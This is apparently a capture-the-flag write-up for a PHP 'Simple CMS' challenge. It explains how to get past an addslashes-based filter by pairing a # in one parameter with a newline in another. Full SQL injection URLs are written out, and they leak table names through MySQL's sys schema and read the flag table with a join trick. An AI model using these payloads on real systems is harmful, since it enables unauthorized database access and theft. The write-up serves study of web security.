## Simple CMS - Web Challenge

We are given a URL and a zip file with PHP source code, [fbbc0672fb3688a554ddb76e95c4971b.zip](fbbc0672fb3688a554ddb76e95c4971b.zip). The
first thing we notice is *waf.php* which is responsible for filtering user input. All of the program logic is in the classes directory.

The primary function of *waf.php* is to call **addslashes** on every input, e.g. query parameters, form data, cookies, etc. This is a
decent hint that we need to look for an SQL injection bug that doesn't require us to use any quotes. Looking at DB.class.php, it appears
that many parameters to **fetch\_multi\_row** are not enclosed in single quotes, so we start by looking at its callers.

The only interesting caller is **action\_search**. It passes the result of **get\_search\_query** in as a condition which is unescaped.
Unfortunately, it also encloses the column name within parentheses and **action\_search** filters any input that contains a parenthesis.
One interesting character that is not filtered is **#**, which causes MySQL to ignore the remaining characters.

The trick is to use a **#** in the column and a newline in the search term, which allows us to bypass both the regex filter on
the column name and the addslashes on the search term, since addslashes does not escape a newline. 

```
http://13.125.3.183/index.php?act=board&mid=search&col=%23&type=1&search=%0a1)=0%20union%20select%201,2,3,4,5%20%23
```

The next part is trying to find the hidden flag table. *waf.php* also filter the usual methods of leaking information about the
database schema. It does not block the *sys* database or its tables, so we use them to leak out the recent database queries.

```
http://13.125.3.183/index.php?act=board&mid=search&col=%23&type=1&search=%0a1)=0%20union%20select%201,query,3,4,5%20from%20sys.statements_with_full_table_scans%20%23

...

SELECT * FROM `41786c497656426a6149_board` WHERE `LOWER` (?)
```

Now that we have the secret prefix for the tables, we know we need to read from **41786c497656426a6149\_flag**. We still do not know
the column names, however. Instead of using the column names, we can read all of the columns using a wildcard. Unfortunately, we
need the union to return five columns, but the flag table only has four columns.

One way to return additional columns is to join with another table. The result of the wildcard will now include the columns from both
tables. We join with a temporary table that returns one column, so we now have a result with a total of five columns.

```
http://13.125.3.183/index.php?act=board&mid=search&col=%23&type=1&search=%0a1)=0%20union%20select%20*%20from%20(select%201)%20as%20b%20join%20(select%20*%20from%2041786c497656426a6149_flag)%20as%20a%20on%201=1%23

flag{you_are_error_based_sqli_master_XDDDD_XD_SD_xD}
```

